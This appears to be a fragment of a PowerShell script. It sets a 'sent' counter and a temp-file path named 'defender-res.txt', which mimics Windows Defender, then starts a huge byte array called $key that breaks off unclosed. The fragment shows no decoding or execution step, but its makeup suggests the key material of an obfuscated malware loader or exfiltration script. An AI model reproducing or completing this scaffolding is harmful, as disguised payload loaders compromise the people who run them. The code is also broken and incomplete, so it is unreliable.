$sent = 0
$fname = "$env:TEMP\defender-res.txt"
$key = [byte[]](215,194,241,104,227,144,14,174,114,200,246,47,173,23,167,210,32,183,43,187,204,108,49,109,86,251,4,14,73,37,73,168,230,22,94,148,181,62,245,133,223,8,13,94,79,8,224,38,243,27,145,137,28,226,124,218,155,102,112,148,243,117,188,187,212,190,54,170,251,202,27,246,198,77,154,195,68,247,36,51,202,251,55,45,213,99,139,129,238,74,55,102,81,184,18,132,46,51,238,64,110,103,219,92,115,125,183,247,90,186,21,7,167,252,145,85,26,212,151,53,87,95,186,136,85,35,19,201,49,162,89,215,1,178,68,157,12,174,39,130,168,159,136,95,101,141,109,15,18,11,98,182,147,160,95,190,239,96,127,173,129,83,47,149,187,106,237,28,95,141,81,57,48,112,14,19,165,250,94,38,242,157,179,212,185,38,247,11,47,28,71,116,244,249,145,225,210,191,86,66,135,208,190,191,142,47,89,242,15,68,199,225,114,66,74,223,73,32,72,204,246,254,192,6,73,254,97,184,177,105,151,34,184,123,34,207,60,234,9,1,99,211,233,120,61,91,123,5,139,17,119,83,184,24,176,124,224,184,95,187,31,7,32,202,245,27,38,103,232,29,94,109,121,84,217,148,13,250,36,215,212,204,113,189,10,157,193,238,156,92,151,154,18,3,188,164,76,48,189,127,113,90,99,37,206,231,49,72,204,110,77,58,232,17,137,71,67,107,184,195,233,141,159,234,25,95,75,44,94,203,241,177,85,214,252,68,204,123,109,220,152,138,224,75,5,8,201,237,71,195,106,62,115,148,56,210,144,70,165,30,180,55,222,173,148,168,108,100,24,50,31,82,228,192,18,114,179,126,109,29,193,123,221,112,226,3,6,4,3,120,138,131,134,194,216,149,80,177,88,237,109,120,150,148,173,253,180,59,113,10,254,115,201,111,233,252,50,99,217,59,71,230,48,8,38,203,227,90,21,112,212,61,23,199,72,45,71,104,57,119,20,26,64,205,49,76,209,242,89,144,46,108,254,103,121,12,58,121,219,90,223,208,123,192,77,209,82,133,244,55,96,253,211,101,14,198,188,224,38,250,221,65,250,247,189,204,58,207,30,219,135,66,188,150,58,182,73,158,81,35,52,137,91,88,244,66,200,65,35,45,130,179,176,75,3,230,108,169,244,104,136,255,95,204,93,53,179,237,144,7,201,97,245,176,114,193,182,253,80,209,211,36,200,90,15,55,56,247,239,130,115,132,234,100,149,12,10,234,235,208,75,225,31,187,225,17,72,187,30,136,24,70,4,24,44,62,52,76,115,160,98,251,217,42,178,210,224,234,170,29,180,85,185,190,237,221,196,18,222,69,174,200,61,186,45,137,105,221,51,148,163,82,42,230,86,108,143,230,181,76,230,28,57,160,53,202,46,81,143,206,12,57,131,116,236,168,199,96,75,124,202,142,172,72,245,154,19,142,23,169,192,35,92,162,123,16,40,41,94,239,182,166,91,58,50,196,168,42,16,111,197,193,18,202,210,103,190,56,198,44,45,201,96,0,160,56,203,167,159,219,45,203,56,138,141,187,98,255,36,182,66,193,124,211,170,227,168,35,113,217,56,29,92,201,198,74,175,41,155,231,212,56,40,118,182,211,168,66,180,79,208,9,2,217,106,235,200,166,20,108,150,72,43,76,2,195,233,84,74,129,181,18,88,98,2,43,93,110,189,174,129,70,18,55,183,159,226,251,106,175,73,131,110,165,116,153,117,9,114,62,14,93,136,100,89,60,1,189,224,205,67,97,154,203,119,149,161,217,102,224,1,221,227,116,169,61,51,27,145,197,12,162,138,176,154,51,172,22,216,50,96,132,199,170,201,208,148,196,81,15,50,168,180,164,140,209,209,191,32,137,45,84,23,216,93,162,175,102,65,52,117,117,248,44,125,77,42,72,183,58,180,2,215,131,77,93,199,163,29,192,144,55,43,199,171,109,189,39,100,207,146,101,216,217,41,206,228,95,3,16,236,233,151,19,201,0,158,208,200,241,112,144,110,34,144,191,94,253,30,141,252,238,26,16,1,96,184,201,109,129,239,64,208,175,23,125,7,145,37,183,236,165,96,88,181,245,206,252,66,245,213,94,234,210,58,4,244,174,98,171,137,43,69,5,53,226,116,117,41,59,216,151,205,54,161,241,37,111,192,114,187,55,30,9,149,238,190,115,55,136,118,220,98,54,246,155,2,101,33,223,241,53,145,225,191,250,66,169,219,25,107,187,158,120,140,215,30,179,64,64,255,144,105,89,219,64,88,84,128,181,120,252,101,225,142,114,99,43,222,113,105,205,135,153,161,25,84,243,188,218,87,91,242,246,231,117,80,160,209,111,24,181,27,93,175,175,132,147,63,67,230,122,136,201,189,2,204,209,228,193,33,104,101,172,162,113,116,111,83,189,6,49,239,115,127,193,50,151,97,21,155,155,131,3,69,91,55,178,141,146,20,215,108,129,137,252,73,85,170,170,186,155,49,236,103,97,213,48,239,40,237,88,171,195,22,105,164,137,230,149,207,227,240,32,239,173,23,129,1,188,44,145,147,2,101,229,235,215,246,105,50,66,163,98,6,149,215,67,33,15,43,166,104,40,5,19,139,58,115,8,189,11,112,128,32,229,79,211,19,93,194,222,229,116,3,17,8,91,193,114,107,252,46,90,240,89,22,109,196,175,38,34,19,207,233,177,63,152,93,155,106,122,2,2,131,163,81,26,189,168,163,8,197,197,155,56,215,60,177,70,19,205,23,7,163,115,41,202,117,205,140,155,147,145,220,111,197,60,198,218,247,153,0,9,247,228,185,33,123,226,93,243,146,123,105,120,99,208,208,81,207,227,8,42,135,78,128,115,15,6,66,44,103,164,64,106,45,221,85,232,75,126,170,47,146,112,222,109,115,178,239,113,155,180,17,157,83,52,82,229,193,118,193,22,183,208,160,36,240,78,160,217,32,212,9,27,54,84,12,128,212,88,217,21,81,104,183,17,17,218,59,14,192,173,226,100,191,5,117,94,16,24,118,228,4,63,88,229,144,235,174,164,174,141,3,118,248,144,48,25,172,144,125,84,33,129,85,204,176,199,150,136,70,190,242,181,162,77,66,59,61,104,46,145,59,221,106,63,119,23,216,46,196,165,55,242,91,111,225,15,230,29,157,69,8,115,218,139,7,141,161,71,154,149,237,84,62,1,236,120,23,219,107,53,119,250,63,49,229,215,148,231,138,102,24,14,178,61,124,54,101,247,168,111,125,207,138,235,29,72,89,15,86,229,41,33,119,194,11,98,28,125,159,163,116,250,244,97,2,219,87,50,198,24,95,59,91,122,97,217,4,172,8,146,49,187,103,246,11,69,255,35,98,102,234,174,164,5,201,42,48,162,143,156,244,91,15,23,52,119,11,226,212,68,81,240,100,183,184,163,105,154,114,67,23,45,45,159,155,223,64,123,137,156,196,182,114,96,48,212,228,172,63,80,243,107,9,186,49,17,130,154,179,250,194,247,50,162,199,131,76,99,101,70,255,161,98,182,13,250,133,157,106,4,212,209,134,2,241,18,219,195,91,138,200,67,178,246,184,65,7,129,47,107,254,48,118,205,192,169,176,97,185,36,175,94,33,164,247,143,53,17,126,135,77,193,186,240,207,104,210,112,210,109,209,37,184,107,103,177,182,250,179,140,226,176,154,103,8,208,66,44,228,31,140,15,28,255,200,126,6,56,240,248,142,254,65,236,113,159,119,197,245,228,45,52,122,102,77,187,99,91,192,170,184,220,25,163,113,23,48,138,29,122,108,129,194,117,61,188,195,16,141,244,156,44,124,42,41,10,6,129,41,251,241,200,0,92,66,222,217,53,216,114,82,46,150,181,168,93,209,231,122,94,164,32,199,232,212,199,166,163,33,171,65,102,55,147,53,60,54,91,80,219,230,182,40,6,44,221,181,231,42,187,178,104,57,174,148,80,59,222,174,131,34,66,145,124,220,65,33,82,116,248,161,251,18,42,209,32,110,97,150,199,138,169,55,191,152,240,185,136,217,42,190,166,78,126,15,181,130,131,44,196,112,62,123,179,245,242,115,21,12,125,206,242,183,35,230,167,39,86,63,160,112,248,125,235,40,43,188,61,103,105,117,161,244,216,36,46,0,93,218,136,181,178,239,47,151,193,53,66,26,253,205,224,163,32,147,220,149,122,193,81,17,228,119,194,196,176,141,248,6,10,225,168,148,166,194,183,252,138,249,113,43,102,226,112,56,202,133,186,55,86,162,23,141,248,60,55,178,180,128,82,136,168,252,243,37,235,57,182,100,64,166,251,93,243,177,136,28,68,227,51,103,72,49,129,49,167,86,59,157,138,75,225,208,245,44,115,56,156,68,217,2,100,119,14,6,226,109,145,232,214,212,245,179,11,15,143,0,57,136,218,61,87,85,222,174,30,200,224,79,27,20,230,147,144,80,51,0,180,254,54,176,122,177,212,112,184,101,77,121,185,188,126,142,196,177,154,84,37,26,56,234,88,21,194,165,83,237,6,182,106,241,171,142,241,106,38,15,88,162,22,159,221,117,108,100,53,184,45,135,157,52,208,185,247,209,238,43,238,19,28,0,111,16,231,153,165,18,241,82,51,240,237,56,218,102,80,176,148,48,45,170,31,157,179,8,206,147,192,113,67,1,162,180,77,244,231,14,233,197,8,92,187,32,177,54,147,31,240,228,189,195,85,158,141,40,6,10,150,167,254,30,61,168,35,180,235,173,141,14,101,41,135,139,101,95,113,150,218,183,19,12,79,197,77,100,131,30,85,107,0,34,109,105,82,14,51,8,63,0,244,143,195,154,0,231,213,197,52,138,159,102,200,235,186,214,244,213,240,247,198,205,59,7,168,42,148,11,93,181,222,28,222,217,70,27,233,115,238,212,18,30,4,0,224,243,83,95,145,183,245,34,63,161,212,113,197,30,13,161,188,108,57,163,225,134,29,248,0,123,46,77,198,152,178,11,105,67,64,29,62,16,37,110,179,163,245,47,131,23,114,65,16,61,193,227,179,6,166,198,170,113,61,219,48,88,46,228,188,182,96,228,250,66,85,13,172,50,45,36,188,74,249,60,68,153,54,231,133,226,168,190,83,194,78,166,49,152,50,68,234,132,125,94,97,98,145,56,190,159,46,199,143,68,68,62,32,170,99,21,247,11,219,112,41,100,141,107,109,36,53,14,176,197,17,227,114,222,191,78,142,129,57,178,150,99,86,153,28,7,16,97,81,53,38,109,215,133,76,15,49,185,53,215,28,158,202,151,102,114,38,139,83,69,208,221,222,172,195,85,65,171,20,237,122,67,249,165,138,69,221,241,52,123,231,43,234,188,158,6,98,148,225,192,22,27,149,216,111,123,252,18,60,159,5,154,142,182,13,251,120,214,136,45,60,128,91,17,127,171,218,92,201,15,29,173,22,13,31,147,175,199,20,252,34,200,10,61,144,224,182,14,255,121,27,22,68,241,246,245,91,160,204,219,193,250,94,51,222,139,24,244,97,175,249,172,211,166,123,39,15,44,43,36,37,203,123,242,3,6,28,123,207,117,25,142,137,75,148,242,99,229,222,95,204,243,173,17,147,82,245,20,18,164,115,73,74,140,100,70,195,58,109,143,163,55,169,16,217,62,218,51,164,214,158,211,29,3,190,59,102,40,65,10,0,119,178,5,148,130,179,144,42,48,221,220,157,167,74,133,182,204,92,186,222,123,132,134,27,63,209,165,42,105,247,72,136,136,170,6,23,31,165,58,32,120,61,29,42,14,85,18,96,233,159,108,238,134,201,19,218,116,75,51,30,130,24,106,96,193,8,185,56,210,85,141,1,210,101,72,84,204,73,164,21,160,168,187,130,172,111,52,126,150,203,159,141,209,245,20,86,206,91,5,220,55,39,219,185,192,123,1,230,138,158,141,239,27,152,212,156,46,199,147,251,61,41,193,35,70,221,88,137,62,35,171,147,114,250,212,119,24,118,179,252,246,72,22,188,157,221,108,91,132,246,77,36,168,44,141,68,195,162,38,86,91,212,31,94,122,55,94,112,141,146,125,50,237,130,242,160,100,221,55,149,115,39,170,200,217,25,252,67,218,203,219,164,20,72,148,17,63,90,41,98,148,149,126,254,59,180,216,154,122,120,221,46,53,253,7,243,112,70,236,22,249,90,137,56,124,178,49,155,70,121,3,224,23,98,209,219,229,61,85,12,202,40,243,191,55,63,45,131,104,238,110,92,19,6,243,35,243,255,255,177,161,246,224,206,1,50,165,53,113,175,39,244,234,20,163,1,74,9,137,100,18,98,91,245,186,52,77,167,163,235,250,167,128,42,89,73,218,132,55,108,160,201,18,187,161,174,3,171,38,180,145,19,152,99,153,98,46,102,246,202,39,195,220,166,69,245,16,3,225,23,82,18,62,157,177,211,227,233,169,131,184,13,218,56,131,105,152,249,58,157,5,129,168,240,243,158,109,210,229,81,99,193,167,251,89,95,251,36,40,71,122,1,191,53,89,120,185,250,24,74,6,187,240,119,63,118,215,174,104,142,136,94,89,185,210,84,67,55,85,102,13,46,140,119,239,89,237,162,137,225,91,227,48,248,240,18,157,32,75,87,186,195,216,151,79,207,41,78,29,87,167,38,182,125,180,127,118,184,221,160,31,91,123,104,253,79,233,220,160,50,2,231,83,98,46,154,64,18,105,15,121,239,25,166,149,38,252,138,75,133,254,142,43,190,98,31,76,82,46,231,82,51,91,242,144,118,241,77,213,88,195,208,65,145,47,17,132,27,153,50,54,121,16,160,255,140,109,226,102,230,209,186,89,114,186,169,76,32,136,113,174,200,39,157,17,77,156,173,8,147,205,205,86,149,140,18,173,78,131,242,32,246,78,158,117,232,138,94,117,13,151,64,107,73,155,27,66,85,129,225,165,118,20,172,97,153,129,165,11,196,117,25,14,40,203,78,211,169,178,119,35,168,214,13,202,226,221,120,0,223,9,2,62,2,142,31,124,169,80,145,22,252,111,107,181,213,19,197,20,46,52,231,114,205,47,184,17,44,37,41,22,6,216,154,228,113,154,120,48,146,108,6,207,187,126,25,205,203,137,10,186,183,42,102,57,12,173,28,243,130,136,192,165,169,25,205,80,227,176,155,177,50,219,49,5,61,217,120,28,164,229,234,78,56,103,245,4,24,22,23,209,20,131,204,100,84,76,211,246,1,178,43,212,161,170,84,15,135,43,203,20,85,50,143,119,70,119,172,93,65,181,116,81,98,247,171,237,51,77,192,231,209,187,200,245,210,160,30,251,222,46,250,192,5,57,22,96,46,186,73,221,71,137,88,34,217,158,172,103,27,135,146,202,188,172,47,144,42,11,80,63,113,169,15,152,247,19,248,93,139,212,71,192,126,130,3,88,35,119,140,58,69,254,254,203,78,118,5,18,201,152,29,47,246,28,161,19,248,16,166,43,81,166,55,236,70,61,79,232,66,51,56,50,42,42,180,109,189,177,109,236,228,109,204,212,52,161,75,91,121,162,225,59,120,195,206,31,4,167,69,142,238,125,167,157,109,36,84,94,240,202,109,1,235,243,125,200,96,70,193,131,151,94,203,166,29,66,184,147,77,185,60,237,43,192,176,109,86,24,96,157,234,114,28,9,237,236,119,28,175,186,196,155,210,67,79,5,121,255,34,8,124,170,170,96,45,171,85,155,247,217,249,2,129,206,121,224,175,174,231,233,221,77,167,139,184,49,245,41,52,66,171,125,224,52,206,31,0,71,158,33,47,64,229,84,227,6,237,27,167,249,7,208,220,110,132,85,231,145,146,74,215,86,98,178,61,33,131,241,37,135,7,254,160,211,77,86,195,91,75,138,133,103,46,231,12,45,178,201,170,61,214,118,130,26,182,244,123,47,140,211,46,213,127,66,211,138,23,66,162,83,170,3,151,170,227,239,112,103,236,113,148,227,2,149,118,16,74,158,232,159,7,156,215,59,71,42,179,62,43,209,152,110,44,230,203,99,176,60,37,202,5,75,151,136,84,248,87,127,26,120,132,32,16,162,134,215,63,177,183,136,76,149,70,19,43,60,216,180,43,109,184,89,73,10,96,174,120,186,73,174,102,12,39,14,127,127,15,120,110,59,38,225,2,16,217,162,17,110,174,175,27,179,212,247,37,107,194,135,1,32,79,226,42,193,3,79,101,222,146,162,156,44,0,219,205,129,25,198,148,62,95,11,62,239,179,219,164,64,231,234,118,135,174,182,135,243,30,197,10,199,28,246,81,203,35,147,68,141,112,37,171,25,89,170,211,8,138,21,217,121,192,201,199,144,162,32,179,73,214,119,255,10,212,59,219,92,174,117,201,76,198,237,68,56,25,141,49,196,118,250,44,192,100,224,150,249,231,184,96,179,115,150,191,171,8,220,142,224,149,221,18,183,19,28,206,239,4,60,230,46,226,254,45,140,252,67,130,169,201,16,82,167,223,243,50,170,107,67,112,199,114,153,238,121,192,134,208,255,11,193,63,31,32,247,81,254,148,128,24,209,93,94,63,166,163,18,74,10,206,126,85,100,211,159,160,242,155,193,192,198,84,112,72,97,110,177,175,83,30,143,148,110,63,5,6,163,104,69,234,134,134,181,223,141,122,206,152,106,223,137,182,73,156,189,217,44,247,250,180,164,125,39,9,73,81,222,2,107,9,112,117,249,21,185,224,141,34,49,155,253,43,56,70,93,120,128,244,224,162,116,178,196,253,218,141,225,129,135,47,80,58,51,163,146,247,209,172,22,90,81,142,153,16,233,214,106,169,172,86,149,81,15,225,132,237,126,49,148,255,191,56,129,82,183,211,214,120,201,102,28,182,107,42,1,150,252,93,209,243,63,6,28,41,120,173,59,251,35,233,10,117,207,197,72,52,128,149,34,0,44,39,188,212,133,143,206,20,87,58,89,42,96,134,251,195,4,158,180,29,162,218,20,99,88,222,204,195,64,3,133,220,100,116,250,30,169,225,240,138,71,148,144,66,35,190,27,45,123,3,18,84,205,150,95,217,101,29,16,229,173,223,94,138,119,191,120,204,91,170,241,231,108,32,40,35,37,93,133,149,234,198,163,148,235,33,1,123,45,127,222,17,245,71,178,34,157,128,249,121,116,55,207,116,169,251,70,255,107,73,203,111,172,241,188,72,158,25,3,76,236,166,5,79,211,172,240,98,169,12,147,153,9,213,130,22,151,158,150,130,171,60,40,128,67,30,240,92,25,95,162,91,255,253,36,59,193,177,130,233,231,139,47,172,142,200,232,166,19,127,254,60,61,86,177,106,51,249,213,200,126,62,220,132,159,56,31,186,126,201,153,177,228,220,60,159,205,88,82,189,119,221,43,29,60,197,246,62,215,35,148,64,57,246,100,174,140,128,103,160,94,113,156,41,242,83,237,118,159,227,198,211,72,87,44,170,38,99,78,227,23,228,66,69,225,32,129,10,18,30,21,53,129,212,189,107,156,29,250,84,16,131,155,188,149,158,63,126,250,113,226,7,148,229,240,221,172,133,98,181,240,163,102,104,110,72,227,98,219,149,27,198,15,8,244,77,97,71,237,225,253,6,96,63,162,222,208,42,16,106,143,213,90,44,110,6,55,120,142,46,246,31,129,198,247,5,20,71,56,214,19,26,130,17,150,135,156,217,208,38,48,254,215,202,19,192,80,135,102,241,29,41,59,245,137,109,36,210,64,145,200,33,14,224,119,60,16,151,23,175,193,2,250,192,252,4,159,56,223,133,203,166,217,99,19,57,91,205,158,255,27,252,117,58,131,88,174,15,236,172,167,171,228,16,25,97,218,180,19,127,74,166,124,79,57,186,68,97,47,113,103,170,146,62,146,133,199,73,184,80,43,154,125,49,111,14,81,129,167,71,76,118,185,3,217,212,175,163,12,48,36,215,239,198,246,130,93,73,120,140,141,113,56,20,73,203,179,103,4,195,34,156,143,225,213,73,27,0,181,176,142,241,142,66,181,123,91,124,38,142,231,79,212,30,92,167,131,101,175,221,117,202,28,200,99,149,238,168,98,181,202,36,45,92,43,145,187,151,19,15,192,61,96,151,237,251,157,5,133,212,254,34,221,226,1,251,220,91,218,108,37,190,228,183,246,255,46,142,119,155,96,95,146,117,92,96,168,44,151,172,166,179,222,137,91,140,245,202,231,185,126,94,127,145,119,137,150,53,18,39,193,31,183,231,112,125,239,102,12,137,177,173,179,39,0,74,9,1,81,93,84,41,191,81,127,87,31,71,148,208,154,106,24,238,80,196,80,255,103,175,35,202,170,239,106,73,204,200,4,0,149,245,144,84,227,118,126,216,153,50,51,29,133,8,55,0,154,66,34,8,216,162,232,254,54,248,45,118,206,141,74,184,105,213,42,3,37,242,246,195,63,170,70,121,71,168,112,92,167,57,45,245,155,164,212,124,119,109,169,2,17,167,126,57,164,136,231,211,174,243,119,200,212,238,36,228,189,164,174,209,141,154,237,140,208,249,241,201,238,80,136,21,153,222,198,81,69,19,133,202,68,173,177,25,137,197,114,108,167,67,178,159,168,173,189,19,219,25,200,110,210,150,8,174,190,81,82,99,124,1,59,61,16,56,82,33,147,144,63,4,201,90,155,49,78,132,152,124,113,81,227,123,229,159,240,151,83,227,63,127,53,213,147,130,181,251,173,168,253,20,0,101,210,254,209,53,23,242,32,61,50,176,197,111,3,165,178,171,123,254,138,241,118,0,38,40,132,125,193,206,52,148,35,166,68,182,15,248,126,132,219,177,28,23,233,16,27,249,105,147,132,140,24,169,163,3,153,25,85,213,247,152,190,58,185,106,175,46,30,28,169,5,98,20,223,20,240,195,242,0,169,113,18,180,121,235,151,253,197,124,7,88,97,236,151,1,196,25,140,197,165,28,4,141,175,217,217,240,25,139,147,225,164,217,191,225,53,147,176,253,21,234,16,176,99,159,104,70,123,78,20,59,51,96,52,16,191,164,130,3,13,252,67,137,41,154,67,132,198,6,140,13,156,206,216,162,206,113,194,177,166,91,225,121,251,175,183,89,40,34,187,201,161,224,219,157,220,238,89,115,29,233,173,179,242,149,190,37,70,21,249,75,101,76,150,55,234,166,112,245,57,91,191,87,180,110,27,51,236,76,13,174,15,69,237,134,129,169,70,170,20,45,29,16,128,4,246,209,243,51,9,82,185,185,131,43,168,5,216,51,39,242,168,189,76,0,164,107,101,138,112,115,139,77,170,117,128,198,104,136,172,199,122,31,11,33,222,82,27,247,104,244,24,167,176,77,39,133,87,249,239,33,8,49,113,254,135,241,178,241,193,42,68,226,196,82,24,55,67,189,203,13,6,182,132,241,61,136,101,114,183,139,15,227,4,210,98,193,189,22,87,67,223,197,18,7,14,28,168,153,168,36,104,150,142,243,72,50,60,1,29,112,74,252,76,159,109,221,173,205,198,190,245,196,173,42,118,219,16,158,138,183,106,144,169,48,142,227,201,239,122,163,110,215,177,48,180,203,239,188,18,243,80,4,99,155,144,29,164,126,100,12,55,254,44,176,146,136,108,63,91,89,128,9,221,253,175,13,202,34,127,106,99,247,184,210,31,252,38,112,237,181,28,159,200,118,221,157,236,55,228,8,177,139,47,50,182,120,216,44,92,125,46,158,15,67,254,164,232,205,69,207,13,19,40,251,224,122,104,234,150,57,149,67,191,177,34,22,26,58,38,224,203,93,104,115,94,185,53,206,148,226,200,137,243,130,5,231,230,37,114,128,244,157,222,254,218,51,36,2,217,2,191,130,6,157,236,197,12,63,162,21,123,75,27,13,68,76,18,155,196,171,141,249,163,214,163,235,237,204,178,65,16,99,74,27,96,102,76,54,57,68,63,226,3,85,22,40,124,216,109,250,161,177,201,159,0,99,201,44,155,74,53,64,146,235,55,208,37,151,123,78,86,78,185,235,61,229,248,58,184,250,245,95,94,227,142,162,228,196,22,60,235,176,8,204,26,153,166,165,11,73,15,29,143,254,44,98,36,108,70,155,3,96,74,66,192,51,208,2,16,6,206,54,21,171,134,222,168,213,156,194,225,228,16,220,173,136,241,166,230,239,14,28,148,75,213,212,72,189,61,241,135,158,174,12,44,179,51,234,152,137,69,208,21,229,95,160,199,75,195,57,81,210,49,236,175,30,214,109,12,155,194,92,145,77,26,238,51,137,158,2,203,130,2,197,230,14,91,108,58,230,248,237,241,15,68,119,171,37,164,190,74,213,118,136,0,51,180,62,102,5,155,89,176,127,248,30,25,117,48,213,29,5,15,90,213,169,207,176,173,163,235,138,58,240,1,142,7,23,199,6,247,59,143,120,229,189,142,83,210,164,144,199,137,52,121,86,63,41,184,189,140,82,174,217,139,97,231,9,4,1,35,173,114,76,32,188,22,131,202,77,252,127,206,35,230,47,26,1,138,72,163,27,243,231,90,29,29,113,168,30,254,214,132,93,29,107,64,185,245,229,152,48,82,97,57,146,162,148,45,27,83,111,249,235,22,109,191,155,75,181,83,172,249,84,4,9,114,176,62,5,57,142,235,33,143,80,166,91,209,184,152,116,155,62,77,103,61,224,34,117,251,224,47,141,6,186,16,86,131,24,244,18,80,101,46,242,81,54,83,37,121,185,254,74,12,149,227,40,34,9,86,139,91,56,228,183,137,98,237,105,189,126,201,71,83,239,20,5,184,28,142,155,110,83,202,158,120,118,25,215,176,74,241,232,57,174,230,113,157,234,5,146,145,146,219,226,121,41,73,197,55,119,48,0,122,202,174,211,37,252,229,193,118,127,156,254,62,129,197,9,205,70,182,27,50,58,227,128,201,195,189,143,112,8,18,247,191,74,91,51,189,196,187,66,20,222,229,248,15,125,60,234,209,131,148,250,220,173,184,214,245,19,229,78,11,155,118,210,246,174,41,110,221,180,64,100,224,18,251,46,16,244,222,224,189,251,25,223,84,19,160,242,1,7,145,174,94,181,34,64,235,33,132,109,77,177,185,84,149,83,70,158,225,208,53,66,3,116,15,27,109,26,157,96,206,131,49,179,154,179,32,11,244,32,43,33,82,203,161,106,73,62,240,207,170,203,123,25,176,75,134,199,143,162,10,46,187,159,253,153,42,46,57,93,159,178,43,1,122,151,91,192,215,139,27,122,165,55,74,89,26,70,233,212,174,150,39,184,124,189,199,116,184,170,157,216,163,29,214,9,55,231,71,117,53,34,53,12,92,192,15,164,0,111,223,34,13,103,229,100,203,47,166,199,57,193,103,143,82,10,107,134,103,120,99,146,168,255,136,8,154,112,166,167,245,207,215,132,42,104,212,48,98,138,197,66,249,235,33,29,163,145,189,130,86,23,64,146,105,234,13,151,196,121,136,18,62,211,231,211,202,199,125,127,20,122,178,7,75,225,132,72,90,111,235,247,121,156,10,214,222,226,96,197,31,1,17,80,35,2,170,44,131,196,56,35,230,182,119,160,6,246,22,180,168,87,83,69,234,154,238,76,126,190,111,162,74,54,144,197,134,57,20,30,113,153,97,147,232,154,158,81,190,0,109,130,122,32,141,172,163,219,60,139,54,70,70,51,108,48,106,143,249,223,46,117,188,112,149,125,211,170,21,91,169,138,85,97,229,48,190,129,181,3,9,241,213,125,102,231,119,247,58,177,171,164,213,110,110,138,119,66,158,38,186,183,31,4,29,1,231,161,230,65,209,17,226,159,189,99,235,115,14,152,228,166,91,48,132,81,27,28,150,116,54,46,119,129,108,208,115,223,71,101,171,17,205,170,130,37,227,203,213,176,116,49,164,251,99,33,177,235,105,3,88,155,113,181,211,218,205,7,182,207,253,111,127,234,208,49,202,215,174,240,17,213,76,104,81,8,33,5,175,130,180,124,111,119,65,149,124,246,53,54,173,178,125,214,251,43,179,70,211,8,80,120,239,16,239,188,120,149,250,49,221,189,55,138,244,43,53,232,214,227,83,186,81,105,206,184,36,231,224,66,33,208,77,181,101,22,158,153,155,48,156,20,225,51,194,228,120,178,97,1,44,157,106,24,95,222,247,28,61,199,186,211,251,241,9,119,184,68,115,218,191,238,103,175,68,202,71,183,177,135,166,168,180,44,250,68,191,96,190,207,204,20,141,255,152,116,34,169,94,250,126,0,172,2,44,170,133,91,90,21,218,220,205,168,130,218,210,147,42,56,26,118,41,132,135,171,104,238,240,19,80,206,178,73,84,138,149,183,220,237,142,100,99,25,249,181,186,198,230,91,179,111,153,24,18,222,91,58,32,197,208,246,5,192,63,50,200,8,229,7,138,0,170,105,86,192,188,214,11,73,123,138,49,125,93,214,244,92,210,150,177,188,136,194,26,207,239,77,41,241,176,209,185,59,21,234,9,132,173,71,149,114,221,1,18,84,108,144,113,102,49,36,76,50,215,179,64,36,146,235,208,155,227,199,201,201,229,224,65,176,1,250,16,186,127,155,244,243,27,77,164,83,93,107,136,123,102,48,32,66,190,79,204,40,148,114,37,205,177,67,2,116,25,18,23,74,146,101,208,83,87,242,120,217,74,246,78,252,20,237,163,212,39,251,251,174,35,111,50,157,231,26,115,242,76,67,123,20,22,4,86,192,189,173,134,243,206,169,106,235,194,57,78,142,206,18,168,36,139,189,34,208,207,62,25,38,245,80,104,219,98,38,214,239,42,12,179,248,241,210,96,51,225,243,48,20,25,164,199,17,254,44,211,162,231,169,140,96,213,89,42,147,67,120,185,234,193,37,46,12,40,30,134,106,112,104,52,19,65,40,53,254,194,103,131,227,39,195,1,74,211,188,225,27,16,253,102,115,195,110,59,25,181,238,116,249,115,167,122,34,61,251,92,59,104,209,29,242,87,137,8,104,175,244,98,151,246,136,131,248,232,196,73,245,86,249,130,44,29,134,220,171,114,240,132,61,178,181,240,76,204,109,58,86,171,36,197,210,167,219,164,238,205,62,137,122,197,11,26,119,229,77,90,94,130,12,190,1,203,247,166,30,194,112,54,187,97,238,251,123,235,181,153,106,190,79,47,22,36,58,48,220,186,126,188,217,48,207,82,160,44,186,104,135,104,130,121,116,91,3,199,239,64,197,114,115,197,217,183,73,229,127,113,117,237,64,47,52,68,18,110,239,86,21,185,89,211,74,42,73,173,17,135,184,144,222,215,109,71,170,13,205,138,98,39,164,212,136,84,133,54,146,248,247,54,107,135,147,129,156,34,36,9,121,71,58,32,166,195,132,124,43,130,58,163,79,31,102,14,61,63,211,153,238,150,137,74,146,57,101,5,92,191,151,238,211,40,161,108,38,47,13,50,118,79,224,97,208,128,45,203,156,22,225,138,73,40,235,170,38,130,25,220,46,172,147,146,170,6,60,184,155,67,206,202,209,114,218,190,79,64,165,70,13,126,31,88,138,34,68,63,36,92,97,83,215,151,116,187,30,72,186,188,69,119,152,15,161,111,185,10,48,121,166,140,51,134,12,76,193,14,177,217,108,8,204,9,166,78,192,42,75,21,253,105,59,218,193,163,32,236,143,36,218,111,5,98,62,250,0,166,93,209,71,231,188,74,88,103,30,241,240,36,194,139,40,121,156,24,188,71,141,193,83,228,225,209,29,84,90,222,186,12,176,112,115,249,146,45,153,190,5,197,169,18,155,41,243,190,15,231,103,7,231,171,175,154,64,26,116,48,245,237,65,105,172,192,37,92,142,150,189,140,124,48,201,114,235,118,146,60,107,67,12,236,24,119,143,109,119,1,178,216,13,221,113,71,194,100,113,176,42,208,24,57,238,255,104,174,16,122,34,38,61,74,25,75,16,192,168,73,91,93,22,105,162,232,237,127,204,77,67,169,182,53,66,79,232,228,35,191,198,139,164,253,6,80,77,247,77,38,62,131,255,159,145,58,176,104,216,250,45,207,188,175,233,143,143,72,209,141,132,19,206,195,24,177,45,161,33,141,227,45,16,41,227,216,188,94,205,69,128,16,185,67,183,145,78,14,40,143,142,173,87,35,82,169,23,92,192,123,239,56,151,30,63,65,86,254,241,212,48,144,94,29,69,218,97,145,47,229,37,174,37,113,112,72,147,89,152,93,184,29,166,39,186,129,45,247,155,216,116,214,139,77,52,80,233,140,237,65,10,167,13,195,57,170,21,102,30,93,82,219,18,116,203,88,22,167,39,136,82,132,58,125,160,203,98,231,132,169,60,67,37,219,233,146,28,153,188,118,226,228,151,222,214,213,159,24,155,237,104,128,247,118,250,183,146,131,120,46,151,114,114,111,128,50,42,90,0,113,143,66,18,102,191,34,243,88,250,15,67,65,70,49,87,227,160,212,177,178,16,125,14,124,88,21,65,190,149,166,199,41,52,104,130,212,151,126,237,212,26,218,15,10,198,202,151,65,96,170,61,115,173,136,95,232,7,28,248,37,155,101,17,149,141,235,181,1,145,204,246,71,231,130,157,133,53,37,169,148,42,91,219,39,121,85,28,89,121,240,132,50,167,63,53,7,174,254,212,255,141,89,217,11,36,234,137,82,197,255,235,115,125,208,232,170,252,71,169,251,94,141,158,77,4,76,216,175,221,12,222,171,88,28,215,28,248,160,55,5,251,203,158,136,252,147,